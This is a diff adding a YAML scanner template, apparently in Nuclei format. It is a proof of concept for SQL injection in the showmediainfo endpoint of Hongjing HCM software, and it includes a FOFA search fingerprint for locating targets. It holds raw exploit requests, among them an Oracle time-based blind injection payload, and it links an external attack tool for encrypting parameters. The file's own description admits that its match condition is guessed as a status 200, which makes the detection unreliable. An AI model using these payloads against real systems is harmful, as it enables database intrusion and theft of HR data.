@@ -1,0 +1,47 @@
+id: poc-xv9w8ig47gios3xr
+info:
+  name: 宏景-showmediainfo-SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xv9w8ig47gios3xr
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xv9w8ig47gios3xr
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPaRZJpCZEpUlWj2w12PVFssPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+
+
+    Oracle:
+
+    payload:
+
+    1'' AND 6371=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)||CHR(66)||CHR(105)||CHR(89),6)--
+
+    Payload
+
+    加密攻击下载地址:https://github.com/vaycore/HrmsTool/releases/download/0.1/HrmsTool.jar:'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /workbench/duty/showmediainfo?kind=0&usernumber=0JALorlQogBNgRuaXkp7QCus5DXQ1K1RU60C2QunGQUgKkcXUh9HXukA75IwTpCaGcqFlluMQLvPAATTP2HJFPAATTPgvSl8mZXxPAATTP2HJFPAATTPe2LWnL7Rg2Ceg0zzONMioPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
